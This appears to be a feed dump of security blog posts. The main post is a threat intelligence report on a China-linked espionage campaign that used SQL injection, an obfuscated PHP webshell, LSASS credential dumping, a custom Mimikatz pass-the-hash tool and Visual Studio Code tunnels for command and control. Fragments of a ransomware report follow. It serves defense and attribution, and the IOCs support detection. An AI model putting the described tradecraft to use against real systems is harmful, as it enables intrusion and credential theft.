Eye remains unclear due to the extensive sharing of malware, operational playbooks, and infrastructure management processes within the Chinese threat landscape. The threat actors used a pass-the-hash capability, likely originating from the same source as closed-source custom Mimikatz modifications observed exclusively in suspected Chinese cyberespionage activities, such as Operation Soft Cell and Operation Tainted Love. The malware and tooling used in these campaigns have been linked to several distinct Chinese APT groups. We collectively refer to these custom Mimikatz modifications as mimCN.\nThe long-term evolution and versioning of mimCN samples, along with notable features such as instructions left for a separate team of operators, suggest the involvement of a shared vendor or digital quartermaster responsible for the active maintenance and provisioning of tooling. This function within the Chinese APT ecosystem, corroborated by the I-Soon leak, likely plays a key role in facilitating China-nexus cyberespionage operations.\nThe abuse of Visual Studio Code Remote Tunnels for C2 purposes is central to this campaign. Originally designed to enable remote development, this technology provides full endpoint access, including command execution and filesystem manipulation. Additionally, Visual Studio Code tunneling involves executables signed by Microsoft and Microsoft Azure network infrastructure, both of which are often not closely monitored and are typically allowed by application controls and firewall rules. As a result, this technique may be challenging to detect and could evade security defenses. Combined with the full endpoint access it provides, this makes Visual Studio Code tunneling an attractive and powerful capability for threat actors to exploit.\nTinexta Cyber and SentinelLabs have notified Microsoft about the abuse of Visual Studio Code and Azure infrastructure in connection with Operation Digital Eye.\nInfection Vector and Attack Progression\nThe attackers used SQL (Structured Query Language) injection as an initial access vector to infiltrate Internet-facing web and database servers. User-Agent request headers in the web traffic logs we retrieved indicate that the attackers used the sqlmap tool to automate the detection and exploitation of SQL injection vulnerabilities.\nTo establish an initial foothold and maintain persistent access, the threat actors deployed a PHP-based webshell. Relatively simple in design and implementation, the webshell uses the assert function to execute attacker-provided PHP code. Its implementation does not resemble any other webshells we are familiar with. We track this webshell under the name PHPsert.\nTo disguise the files implementing PHPsert and attempt to evade detection based on filesystem activity, the attackers used custom names tailored to the infiltrated environments, making the filenames appear legitimate. This included using the local language and terms that aligned with the technological context of the targeted organizations.\nAfter establishing an initial foothold, the threat actors conducted reconnaissance using a variety of third-party tools and built-in Windows utilities, such as GetUserInfo and ping. They also deployed the local.exe tool, which is part of the Microsoft Windows NT Resource Kit and allows for viewing user group memberships.\nTo steal credentials, the attackers used the CreateDump tool to extract memory allocated to the Local Security Authority Subsystem Service (LSASS) process and exfiltrate credentials. CreateDump is part of the Microsoft .NET Framework distribution. The threat actors also retrieved credentials from the Security Account Manager (SAM) database, which they extracted from the Windows Registry using the reg save command.\nThe threat actors frequently named the files they deployed using the pattern do.*. Examples include do.log (output from ping commands), do.exe (the CreateDump tool), and do.bat (a script that executes and deletes the CreateDump executable).\nFrom the initially compromised endpoints, the attackers moved laterally across the internal network, primarily using RDP (Remote Desktop Protocol) connections and pass-the-hash techniques. For the pass-the-hash attacks, they used a custom modified version of Mimikatz, implemented in an executable named bK2o.exe.\nIn addition to the PHPsert webshell, the threat actors used two methods for remote command execution: SSH access, enabled by deploying authorized_keys files containing public keys for authentication, and Visual Studio Code Remote Tunnels.\nVisual Studio Code Remote Tunnels, based on Microsoft’s dev tunnel technology, enable developers to access and work on remote systems. This access includes the command terminal and file system, allowing activities such as command execution and file editing. The Operation Digital Eye actors abused this functionality to maintain persistent backdoor access to compromised systems.\nIn an attempt to evade detection based on filesystem activity, the threat actors used %SystemRoot%\\Temp and %ProgramData%\\Visual Studio Code as their primary working directories for storing tools and data. %SystemRoot%\\Temp is a directory where Windows stores temporary files and is often monitored with less scrutiny. %ProgramData%\\Visual Studio Code was intended to appear as a legitimate directory associated with Visual Studio Code.\nThe intrusions were detected and interrupted before the attackers could proceed to further phases, such as exfiltrating data.\nAbuse of Visual Studio Code\nThe threat actors deployed a portable Visual Studio Code executable named code.exe, which is digitally signed by Microsoft, and used the winsw tool to run it as a Windows service. The winsw configuration file we retrieved indicates that the attackers created a service named Visual Studio Code Service, which executes code.exe with the tunnel command-line parameter at every system startup.\nThe configuration file reveals a pragmatic approach by the threat actors, who likely modified a publicly available winsw configuration. This is suggested by the use of the myapp service identifier and the %BASE%\\logs directory for storing winsw log files, both of which appear in the public configuration file as well as in the one we retrieved.\nwinsw configuration file\nThe tunnel parameter instructs Visual Studio Code to create a dev tunnel and act as a server to which remote users can connect. After authenticating to the tunnel with a Microsoft or GitHub account, remote users can access the endpoint running the Visual Studio Code server, either through the Visual Studio Code desktop application or the browser-based version, vscode.dev.\nAfter creating the dev tunnels, the threat actors authenticated using GitHub accounts and accessed the compromised endpoints through the browser-based version of Visual Studio Code. We have no knowledge of whether the threat actors used self-registered or compromised GitHub accounts to authenticate to the tunnels.\nNetwork Infrastructure\nThe Operation Digital Eye actors used infrastructure located exclusively within Europe, sourced from the provider M247 and the Cloud platform Microsoft Azure. This was likely part of a deliberate strategy. Since the targeted organizations are based and operate within Europe, the attackers may have aimed to minimize suspicion by aligning their infrastructure’s location with that of their targets. Additionally, Cloud infrastructure commonly used in legitimate IT workflows, such as Microsoft Azure, is often not closely monitored and is frequently allowed through firewall restrictions. By leveraging public Cloud infrastructure for malicious purposes, the attackers made the traffic appear legitimate, which can be challenging to detect and may evade security defenses.\nIn the initial phases of the attacks, the threat actors used the server with IP address 146.70.161[.]78 to establish initial access by detecting and exploiting SQL injection vulnerabilities, and the server with IP address 185.76.78[.]117 to operate the PHPsert webshell. Both IP addresses are allocated to the infrastructure provider M247 and are located in Poland and Italy, respectively.\nIn the later phases of the attacks, the threat actors used the server with IP address 4.232.170[.]137 for C2 purposes when remotely accessing compromised endpoints via the SSH protocol. This server is part of Microsoft’s Azure infrastructure in the Italy North datacenter region (Azure IP range: 4.232.128[.]0/18, service tag: AzureCloud.italynorth). We currently have no information on whether the threat actors used self-registered or compromised Azure credentials to access and manage the Azure resources and services.\nThe abuse of Visual Studio Code tunneling for C2 purposes also relies on Microsoft Azure infrastructure. Creating and hosting a dev tunnel requires connecting to a Microsoft Azure server with a domain of *.[clusterID].devtunnels.ms, where [clusterID] corresponds to the Azure region of the endpoint running the Visual Studio Code server, such as euw for West Europe. In Operation Digital Eye, the creation of dev tunnels involved establishing connections to the server with the domain [REDACTED].euw.devtunnels[.]ms, which resolved to the IP address 20.103.221[.]187. This server is part of Microsoft’s Azure infrastructure in the West Europe datacenter region (Azure IP range: 20.103.0[.]0/16, service tag: AzureCloud.westeurope).\nThe PHPsert Webshell\nPHPsert executes attacker-provided PHP code using the assert function, which, in PHP versions prior to 8.0.0, interprets and runs parameter strings as PHP code. To hinder static analysis and evade detection, the webshell uses various code obfuscation techniques, including XOR encoding, hexadecimal character representation, string concatenation, and randomized variable names.\nPHPsert implementation\nThe PHPsert webshell operates as follows:\nPHPsert instantiates a class with a single regular method, which XOR-decodes and concatenates hexadecimal characters to generate the string assert. The class’s destructor (the magic method __destruct) uses this string to invoke the assert function, passing attacker-provided PHP code as a parameter.\nThe webshell retrieves the attacker-provided PHP code from an HTTP POST request parameter, for example, momomomo. If the id parameter is present in the request URL, PHPsert decodes the Base64-encoded value of the POST parameter. If the id parameter is absent, the webshell uses the raw value of the parameter.\nFinally, when PHPsert finishes executing, the class’s destructor is invoked, which in turn calls the assert function to execute the attacker-provided PHP code.\nWe identified multiple PHPsert variants, which have been submitted to malware sharing platforms since May 2023, from various locations including Japan, Singapore, Peru, Taiwan, Iran, Korea, and the Philippines. These variants show only minor differences in their implementation, such as varying variable names and POST request parameters like mr6, brute, and qq. Our analysis suggests that PHPsert is deployed not only as a standalone PHP file but is also integrated into various types of web content, including web text editors and content management systems.\nOne of the PHPsert variants contains commented-out code snippets and comments in simplified Chinese that describe nearby code. These comments and snippets are not present in the PHPsert versions observed in Operation Digital Eye, nor in any of the webshell’s other variants. Below are the code comments, all of which are machine-translated from simplified Chinese:\n结果是\"assert\", which translates to The result is \"assert\".\n验证 $this->rg 是否安全, which translates to Verify that $this->rg is safe.\n验证和清理用户输入, which translates to Validating and sanitizing user input.\n\n\nPHPsert code snippets with comments in Chinese\nThe presence of these comments, along with the indicators of removed code across PHPsert variants, suggests the potential involvement of Chinese-speaking developers who may have been simplifying the webshell’s execution logic.\nPass-the-Hash Capability\nThe bK2o.exe executable (a custom modified version of Mimikatz used in Operation Digital Eye for pass-the-hash attacks) enables the execution of processes within a user’s security context by leveraging a compromised NTLM password hash, bypassing the need for the user’s actual password. To achieve this, bK2o.exe overwrites memory of the LSASS process. The tool supports the following command-line parameters:\n/c: The process to execute; defaults to cmd.exe if not provided.\n/u: The user’s username.\n/d: The user’s domain.\n/h: The NTLM password hash.\nbK2o.exe implements a pass-the-hash technique by overwriting LSASS memory in a manner similar to Mimikatz, with its implementation partially overlapping with Mimikatz functions such as kuhl_m_sekurlsa_pth_luid and kuhl_m_sekurlsa_msv_enum_cred_callback_pth. In summary, bK2o.exe performs the following:\nCreates a suspended process in a new logon session, specifying the attacker-provided process, username, domain, and an empty password.\nBased on the session’s locally unique identifier (LUID), locates and extracts from the LSASS process memory an encrypted credential data blob containing the user’s NTLM hash and the encryption keys required to decrypt the blob.\nDecrypts the data blob, overwrites the user’s NTLM hash with the attacker-provided hash, and re-encrypts the data blob.\nResumes the suspended process.\nbK2o.exe creates a new process and retrieves the logon session’s LUID\nTo navigate LSASS memory, bK2o.exe uses code signatures, represented as byte sequences in hexadecimal format. These sequences correspond to known LSASS instructions, which serve as navigation points within the memory.\nTo hinder static analysis and evade detection, bK2o.exe obfuscates code signatures and strings by constructing them dynamically on the stack at runtime, instead of storing them as static data.\nbK2o.exe constructs the string lsasrv.dll on the stack\nbK2o.exe constructs the code signature 33 ff 41 89 37 4c 8b f3 […] on the stack\nFrom Operation Digital Eye to Tainted Love and Soft Cell\nWe identified two additional samples uploaded to malware sharing platforms that construct code signatures on the stack, which we refer to as wsx1.exe and wsx1.exe. Like bK2o.exe, both wsx.exe and wsx1.exe are custom modified versions of Mimikatz and implement pass-the-hash functionality.\nSubstantial code segments in wsx.exe and wsx1.exe, which implement the construction of code signatures on the stack, overlap with those in bK2o.exe, including identical mov instruction operand sizes and values. This suggests that wsx.exe, wsx1.exe, and bK2o.exe are highly likely derived from the same source.\nCode segment in bK2o.exe\nCode segment in wsx1.exe\nIn turn, we observed overlaps between wsx.exe, wsx1.exe, and mim221 components. mim221 is a versioned and well-maintained credential theft tool, also a custom modified version of Mimikatz, which SentinelLabs observed in Operation Tainted Love — a campaign targeting telecommunication providers in the Middle East in 2023.\nWe attributed Operation Tainted Love to a suspected Chinese cyberespionage group within the nexus of Granite Typhoon (formerly known as Gallium) and APT41, while acknowledging the possibility of tool sharing among Chinese state-sponsored threat actors and the potential involvement of a shared vendor or digital quartermaster. We assess that mim221 represents an evolution of tooling associated with Operation Soft Cell, such as simplify_32.exe. Operation Soft Cell, which targeted telecommunication providers in 2017 and 2018, has been linked to Granite Typhoon, and possible connections between the Soft Cell actors and APT41 have also been suggested.\nmim221 has a multi-component architecture, with a single executable staging three components — pc.dll, AddSecurityPackage64.dll, and getHashFlsa64.dll — using techniques such as decryption, injection, and reflective image loading. These components share several overlaps with bK2o.exe, wsx.exe, and wsx1.exe.\nTo hinder static analysis, some mim221 components also obfuscate strings by constructing them on the stack at runtime. Additionally, the mim221 components AddSecurityPackage64.dll and getHashFlsa64.dll implement error logging similar to that of wsx.exe and wsx1.exe, including identical custom error messages, a consistent output format, and the same English-language errors.\nError messages in mim221\nError messages in wsx.exe and wsx1.exe\nIn addition, RTTI (Run-Time Type Information) information stored in wsx.exe, wsx1.exe, and the mim221 component getHashFlsa64.dll reveals that classes with the same names are declared across these executables. We have not observed these class names in open-source or publicly available tooling.\nClass names (those present in more than one executable are highlighted in bold)\nmimCN | A Collection of China-Nexus APT Tools\nDue to the previously discussed overlaps between bK2o.exe (used in Operation Digital Eye), wsx.exe, wsx1.exe, mim221 components (used in Operation Tainted Love), and simplify_32.exe (used in Operation Soft Cell), we collectively refer to this collection of tools as mimCN.\nThe mimCN samples bK2o.exe, wsx.exe, wsx1.exe, and mim221\nWe include in the mimCN tool collection not only the previously mentioned tools but also any other custom modifications of Mimikatz that have overlaps with other mimCN executables, suggesting they may originate from the same source. Such overlaps include shared code-signing certificates and the use of unique custom error messages or obfuscation techniques.\nTo date, we have observed mimCN tools exclusively in the context of suspected Chinese APT activities. Although the compilation timestamps of the mimCN samples observed in these intrusions could have been manipulated, the proximity of the timestamps to when the activities occurred suggests that they are likely authentic.\nOperation\nmimCN sample\nCompilation timestamp (UTC)\n\n\nDigital Eye\nbK2o.exe\nThu May 30 08:47:56 2024\n\n\nTainted Love\nmim221 (pc.exe)\nThu Jun 09 08:02:12 2022\n\n\nTainted Love\nmim221 (AddSecurityPackage64.dll)\nThu Jun 09 08:01:46 2022\n\n\nTainted Love\nmim221 (pc.dll)\nTue Jun 07 16:55:05 2022\n\n\nTainted Love\nmim221 (getHashFlsa64.dll)\nFri May 27 20:56:26 2022\n\n\nSoft Cell\nsimplify_32.exe\nTue Nov 20 03:54:21 2018\n\n\n\n\n\nUse of mimCN samples\nFurther, unique usage instructions found in some mimCN samples, such as [ERROR]Please input command. eg, /cmd:xxx  and [ERROR]Please input ip. eg, /ip:xx.XXX.xx.x or /ip:xxx.com, suggest the involvement of a dedicated development team that is leaving instructions for a separate group of operators. Combined with the presence of overlapping mimCN samples across various intrusions attributed to China-nexus APT groups and distributed over years, this suggests that mimCN is likely the product of an entity responsible for maintaining and provisioning tools to multiple clusters within the Chinese APT ecosystem.\nAttribution Analysis\nWe assess that Operation Digital Eye was highly likely conducted by a China-nexus cluster with cyberespionage motivations. The specific group responsible remains unclear due to the extensive sharing of malware, operational playbooks, and infrastructure management processes among Chinese APT clusters. Our assessment is based on a collective consideration of multiple indicators, including the malware, infrastructure, and techniques used, victimology, and the timing of the activities.\nMalware\nA variant of the PHPsert webshell contains code comments in simplified Chinese. This suggests the potential involvement of Chinese-speaking developers. Further, the custom Mimikatz modification bK2o.exe used in Operation Digital Eye is part of the mimCN collection and shares implementation overlaps with other custom Mimikatz modifications, suggesting a common origin. These tools have been observed exclusively in the context of suspected Chinese APT activities, such as Operation Soft Cell and Operation Tainted Love. Malware and tooling used in these operations have been associated with the suspected Chinese APT groups Granite Typhoon and APT41, and possible connections to other China-nexus groups, such as APT10 and Lucky Mouse have also been suggested.\nThe mimCN tool collection suggests the presence of a shared vendor or digital quartermaster responsible for the sustained development and provisioning of tools to groups within the Chinese APT ecosystem. This function is suspected to play a significant role in the Chinese threat landscape. The I-Soon leak, which offers rare insight into China’s cyberespionage activities, provides supporting evidence for the existence of digital quartermasters within this landscape.\nInfrastructure\nWhile not exclusive to Chinese APT groups, the use of M247 infrastructure, as seen in Operation Digital Eye, has been common among them in recent years. One example is the M247 infrastructure attributed to the suspected Chinese cluster STORM-0866 (also known as Red Dev 40), with which the Sandman APT group is associated.\nAdditionally, the use of Cloud services and resources located in geographic proximity to the targeted organizations in Operation Digital Eye suggests a carefully planned and targeted infrastructure management approach. In this context, we suspect the potential involvement of third-party entities tasked with administering and provisioning infrastructure, a practice that has become increasingly common in the Chinese APT ecosystem in recent years.\nAbuse of Visual Studio Code\nOur visibility into threat actor activities suggests that the abuse of Visual Studio Code tunneling for C2 purposes was relatively rare in the wild before Operation Digital Eye.\nPrevious research indicates that, starting in 2023, a suspected North Korean group has used Visual Studio Remote Tunnels to maintain persistence in compromised networks. Additionally, in October 2024, Cyble released a report documenting unattributed activity in which threat actors distributed a Windows Shortcut (LNK) file to deploy Visual Studio Code and activate its tunneling feature to establish remote access.\nAs of this writing, the only publicly disclosed use of this technique around the time of Operation Digital Eye has been attributed to a suspected Chinese APT group. In September 2024, Unit 42 published a report on a campaign targeting government entities in Southeast Asia, in which threat actors used Visual Studio Code as a backdoor. The campaign was attributed to Stately Taurus (also known as Mustang Panda). The exact timeline of the campaign is unclear, with mid-August 2024 being the only reference point explicitly mentioned in the Unit 42 report. Based on this, we suspect that Operation Digital Eye occurred prior to this activity.\nWe did not observe any overlaps in TTPs between Operation Digital Eye and the activity reported by Unit 42, except for the abuse of Visual Studio Code. We recognize the possibility that distinct Chinese APT clusters may share operational playbooks that include leveraging Visual Studio Code for C2 purposes.\nTemporal Analysis\nOur analysis of timestamps marking the dates and times of operator activity in the targeted organizations showed that all activities occurred on workdays (Monday to Friday). Additionally, converting the timestamps from their original time zones, Coordinated Universal Time (UTC) and Central European Summer Time (CEST, UTC+2), to China Standard Time (CST, UTC+8) revealed that the operators were primarily active during typical working hours in China, mostly between 9 a.m. and 9 p.m. CST.\nThis suggests a potentially state-sanctioned operation. The ‘996’ work schedule (9 a.m. to 9 p.m. CST, six days a week) has been common in China’s technology sector, but it was ruled illegal by the Supreme People’s Court in 2021. As a result, state employees are almost certainly restricted to weekday work, typically between 9 a.m. and 9 p.m., aligning closely with our observations from the timestamp analysis.\nThe figure below shows the total number of connections established by the threat actors to Visual Studio Code tunnels throughout Operation Digital Eye, broken down by hour of the day. The data is presented in both the original time zone (CEST) and in China Standard Time (CST, CEST+6). We observed minimal to no activity between 10 p.m. and 9 a.m. CST, as well as between 11 a.m. and 1 p.m. CST, which aligns with the typical daily working hours in China, including the midday lunch break.\nNumber of established connections to Visual Studio Code tunnels\nConclusions\nOperation Digital Eye highlights the persistent threat posed by Chinese cyberespionage groups to European entities, with these threat actors continuing to focus on high-value targets. The campaign underscores the strategic nature of this threat, as breaching organizations that provide data, infrastructure, and cybersecurity solutions to other industries gives the attackers a foothold in the digital supply chain, enabling them to extend their reach to downstream entities.\nThe abuse of Visual Studio Code Remote Tunnels in this campaign illustrates how Chinese APT groups often rely on practical, solution-oriented approaches to evade detection. By leveraging a trusted development tool and infrastructure, the threat actors aimed to disguise their malicious activities as legitimate. The exploitation of widely used technologies, which security teams may not scrutinize closely, presents a growing challenge for organizations. For defenders, this calls for a reevaluation of traditional security approaches and the implementation of robust detection mechanisms to identify such evasive techniques in real time.\nLateral movement capabilities observed in Operation Digital Eye, linked to custom Mimikatz modifications used in previous campaigns, indicate the potential involvement of shared vendors or digital quartermasters and the important function they serve in the Chinese APT ecosystem. These centralized entities provide continuity and adaptability to cyberespionage operations, equipping threat actors with consistently updated tools and evolving tactics as they target new victims.\nIndicators of Compromise\nSHA1 Hashes\nValue\nNote\n\n\n0be9dd709d7d68887a92c793881dd4a010796e95\nThe CreateDump tool (do.exe)\n\n\n213f06ed5ac9e688816b4bbe73bf507994949964\nThe GetUserInfo tool\n\n\n289f3bfe297923507cf4c26ca500ae01819c6a95\nThe local.exe tool\n\n\n2e2cf8a4a0e7decceb8e22536b13173479da0d13\nPHPsert variant\n\n\n3035d8846d7a9f309f2d24daba6ac33ad99524fc\nPHPsert variant\n\n\n399776991a094e1ee78b2a915bf4491e67c04ec7\nPHPsert variant\n\n\n3a688c844259822c51ceb3aea508303c4a654eb3\nPHPsert variant\n\n\n4d6947a19dd9a420c22fee39fac8b4df95a47569\nPHPsert variant\n\n\n63cea28d927f8e629377399fa08a9cb4fd0c6238\nPHPsert variant\n\n\n6549e50645bb1c02e4972651d335a75cb6d5aa74\nPHPsert variant\n\n\n7941909fd5c1277c6f7baf21e484c9e59ea454ee\nmimCN (bK2o.exe)\n\n\n7cb7bcb9187f8faf47fd77cf1213ab3fe2350a77\nmimCN (simplify_32.exe)\n\n\n82b1cb9b69d5f05bb20852322fb3c2c00bce9134\nmimCN (wsx.exe)\n\n\n83ca53c95705352ff60149b0b17a686956e23172\nPHPsert variant\n\n\na9d6d0c47728094feb794ad7e25c253737633140\nVisual Studio Code (code.exe)\n\n\nb2811cb4d0afe13d2722093039a72588c348dcfd\nPHPsert variant\n\n\nc0e03fce8f7f51e91da79f773aa870f0897b0ee2\nPHPsert variant\n\n\ncb6726fb3f7952ede04ed22d2c72389255991827\nPHPsert variant\n\n\nd57fa43944676c56e66f4b20ffa3d82048e354fd\nPHPsert variant\n\n\ne572380ab95c4ab5a87f701d4654d3386911b387\ndo.bat\n\n\ne8a8d8fa7122c1592a314343b45bac2c213bb57d\nmimCN (wsx1.exe)\n\n\n\n\nIP Addresses\nValue\nNote\n\n\n146.70.161[.]78\nServer used for initial access (SQL injection attack)\n\n\n185.76.78[.]117\nC2 server (PHPsert webshells)\n\n\n20.103.221[.]187\nVisual Studio Code dev tunnel\n\n\n4.232.170[.]137\nC2 server (SSH access)\n\n\n\n\nDomains\nValue\nNote\n\n\n[REDACTED].euw.devtunnels[.]ms\nVisual Studio Code dev tunnel","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2024/11/Op-Digital-Eye-ftr.jpg","length":"524719","type":"image/jpeg"},"dc:creator":"Aleksandar Milenkoski &amp; Luigi Martire (Tinexta Cyber)","content":"Threat actors abused Visual Studio Code and Microsoft Azure infrastructure to target large business-to-business IT service providers in Southern Europe.","contentSnippet":"Threat actors abused Visual Studio Code and Microsoft Azure infrastructure to target large business-to-business IT service providers in Southern Europe.","guid":"https://www.sentinelone.com/?post_type=labs&p=109526","categories":["China"],"isoDate":"2024-12-10T10:55:33.000Z","tag":"intel"},{"creator":"LABScon","title":"LABScon24 Replay | PKfail: Supply-Chain Failures in Secure Boot Key Management","link":"https://www.sentinelone.com/labs/labscon24-replay-pkfail-supply-chain-failures-in-secure-boot-key-management/","pubDate":"Tue, 03 Dec 2024 16:15:30 +0000","content:encoded":"<p>Modern computing heavily relies on establishing and maintaining trust, which begins with trusted foundations and extends through operating systems and applications in a chain-like manner.

Between June and October 2024, CyberVolk claimed responsibility for multiple ransomware attacks.</li>\n<li aria-level=\"1\">The main objective of CyberVolk and related groups is to leverage geopolitical issues to launch and justify attacks on public and government entities, primarily in the service of Russian government interests.</li>\n<li aria-level=\"1\">SentinelLabs has observed a shared codebase used by CyberVolk, AzzaSec and DoubleFace’s ransomware. Additionally, CyberVolk has promoted other ransomware families like HexaLocker and Parano. These groups and the tools they leverage are all closely intertwined.</li>\n<li aria-level=\"1\">These hacktivist groups are extremely dynamic and volatile. In-fighting, threats, and inflated political-posturing are common, leading to fragmentation and the rapid re-shaping of the hacktivist threat landscape.</li>\n</ul>\n<h2>Introduction</h2>\n<p>CyberVolk is a politically motivated hacktivist collective which launched its own RaaS in June 2024. The group uses both DDoS and ransomware attacks in its efforts to undermine and disrupt the operations of those opposed to Russian interests.</p>\n<p>The group has become an increasingly prominent player within the cybercrime ecosystem, adopting and repurposing existing commodity malware to advance its causes. Highly-skilled actors within the collective expand and revise such tools, effectively making them more sophisticated as they move through various hands.</p>\n<p>The CyberVolk collective is a prime example of how readily threat actors can access and deploy dangerous ransomware builders such as AzzaSec, Diamond, LockBit, Chaos and others. This adaptability makes the group highly dynamic and increasingly challenging to track.</p>\n<p>In this post, we provide an overview of a number of ransomware families within the context of CyberVolk’s operations, breaking down the increasingly blurred lines between tools and group affiliations. Understanding the shifting nature of dynamic hacktivist collectives like CyberVolk can help organizations prepare and fortify their defenses.</p>\n<h2>The Origins of CyberVolk Ransomware</h2>\n<p>CyberVolk is a <a href=\"https://threatmon.io/blog/cybervolk-ransomware-technical-malware-analysis/\" target=\"_blank\" rel=\"noopener noreferrer\">pro-India/pro-Russia</a> “hacktivist” group that has been actively targeting entities in multiple countries. In its current form, it emerged during May 2024. Prior to this, the group was known by a few different names, including GLORIAMIST, GLORIAMIST India and Solntsevskaya Bratva. CyberVolk exploits current geopolitical issues, focused on launching and justifying its attacks on public and government entities.</p>\n<p><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_1-1.jpg\" alt=\"\" width=\"540\" height=\"302\" class=\"aligncenter size-full wp-image-109360\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_1-1.jpg 540w, https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_1-1-300x168.jpg 300w\" sizes=\"auto, (max-width: 540px) 100vw, 540px\" /></p>\n<p>While the group claims alliances with other broad groups such as <a href=\"https://www.sentinelone.com/blog/lapsus-data-breach/\" target=\"_blank\" rel=\"noopener noreferrer\">LAPSUS$</a>, <a href=\"https://www.sentinelone.com/labs/hacktivism-and-state-sponsored-knock-offs-attributing-deceptive-hack-and-leak-operations/\" target=\"_blank\" rel=\"noopener noreferrer\">Anonymous</a>, and the <a href=\"https://threatmon.io/blog/digital-war-in-the-middle-east-cyber-threats-in-israel-iran-conflict/\" target=\"_blank\" rel=\"noopener noreferrer\">Moroccan</a> <a href=\"https://threatmon.io/blog/digital-war-in-the-middle-east-cyber-threats-in-israel-iran-conflict/\" target=\"_blank\" rel=\"noopener noreferrer\">Dragons</a>, it has also been associated with <a href=\"https://www.sentinelone.com/labs/noname05716-the-pro-russian-hacktivist-group-targeting-nato/\" target=\"_blank\" rel=\"noopener noreferrer\">NONAME057(16)</a> and other RU-friendly, DDoS-focused, groups.

Demand. Dominate” | HexaLocker Ransomware</h2>\n<p>HexaLocker is a ransomware family that first appeared in July 2024. HexaLocker is closely associated with <a href=\"https://www.sentinelone.com/blog/lapsus-data-breach/\" target=\"_blank\" rel=\"noopener noreferrer\">LAPSUS$</a>, reportedly having been originally developed by “ZZART3XX”, a proclaimed former associate of the group.

As of this writing, we have only observed payloads targeting Windows systems.</p>\n<p>On July 22, CyberVolk first referenced HexaLocker via one of Holy League’s posts. The Holy League is a loosely affiliated group of 70+ members born out of protest against Spain and <a href=\"https://www.reuters.com/technology/cybersecurity/three-pro-russian-hackers-arrested-spain-over-cyberattacks-2024-07-20/\" target=\"_blank\" rel=\"noopener noreferrer\">associated arrests</a> of members of <a href=\"https://www.sentinelone.com/labs/noname05716-the-pro-russian-hacktivist-group-targeting-nato/\" target=\"_blank\" rel=\"noopener noreferrer\">NONAME057(16)</a>. HexaLocker’s posts and branding are all laden with their “Lock. Demand. Dominate” slogan.</p>\n<p>In September 2024, HexaLocker launched a new Telegram channel after previous ones had been banned or removed. The updated channel contains details on their ongoing existence along with screenshots of the current HexaLocker panel.</p>\n<figure id=\"attachment_109306\" aria-describedby=\"caption-attachment-109306\" style=\"width: 869px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_44.jpg\" alt=\"HexaLocker Telegram message\" width=\"869\" height=\"295\" class=\"size-full wp-image-109306\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_44.jpg 869w, https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_44-300x102.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_44-768x261.jpg 768w\" sizes=\"auto, (max-width: 869px) 100vw, 869px\" /><figcaption id=\"caption-attachment-109306\" class=\"wp-caption-text\">HexaLocker Telegram message</figcaption></figure>\n<p>Throughout October 2024, CyberVolk’s communication channels continued to echo messaging from HexaLocker. This includes HexaLocker’s solicitations for help in continuing to progress with HexaLocker. On October 2, 2024, HexaLocker posted an update asking for help but also teasing new features in the pipeline. These include:</p>\n<ul>\n<li aria-level=\"1\">Stronger anti-debug/anti-analysis features</li>\n<li aria-level=\"1\">Advanced obfuscations (crypting/packing)</li>\n<li aria-level=\"1\">Inclusion of EDR/XDR/AV-Killer</li>\n<li aria-level=\"1\">Permanent AMSI bypass</li>\n<li aria-level=\"1\">Improved process-injection</li>\n<li aria-level=\"1\">Remote Thread Hijacking</li>\n<li aria-level=\"1\">UAC Bypass improvements</li>\n<li aria-level=\"1\">Self-deletion</li>\n</ul>\n<p>Interesting developments continued with HexaLocker throughout October 2024. On October 4th, the group posted an update with a video demo claiming that an “EDR Killer” and AMSI/WD Bypass features had been added. This was followed on October 6th with an update stating that UAC bypasses had been added to the product.</p>\n<p>On October 20, 2024, the actor behind the HexaLocker Telegram channel (ZZART3XX) posted their intention to officially leave and denounce LAPSUS$ as well as any peripheral affiliations. This includes the maintenance of the HexaLocker project and all the relationships and alliances that revolve around it.</p>\n<p>In this announcement, the author also indicated that they would be offering HexaLocker source code, including its web panel, along with “LAPSUS$ Ransomware” source for sale.</p>\n<figure id=\"attachment_109320\" aria-describedby=\"caption-attachment-109320\" style=\"width: 500px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_31.jpg\" alt=\"HexaLocker “shut down” posting via Telegram\" width=\"500\" height=\"487\" class=\"size-full wp-image-109320\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_31.jpg 500w, https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_31-300x292.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_31-50x50.jpg 50w, https://www.sentinelone.com/wp-content/uploads/2024/11/CyberVolk_31-24x24.jpg 24w\" sizes=\"auto, (max-width: 500px) 100vw, 500px\" /><figcaption id=\"caption-attachment-109320\" class=\"wp-caption-text\">HexaLocker “shut down” posting via Telegram</figcaption></figure>\n<p>This was followed the next day on October 21 with offers to sell HexaLocker and the panel infrastructure, along with associated “LAPSUS$ Ransomware”.

Though primarily composed of lower-skilled threat actors that reach for and use whatever works for them, we continue to see how quickly the group is able to move and adapt.</p>\n<p>The reuse of tools like AzzaSec Ransom, Diamond RW, and even more established ones like LockBit and Chaos, demonstrates just how dynamic these affiliations and alliances between hacktivist groups can be.

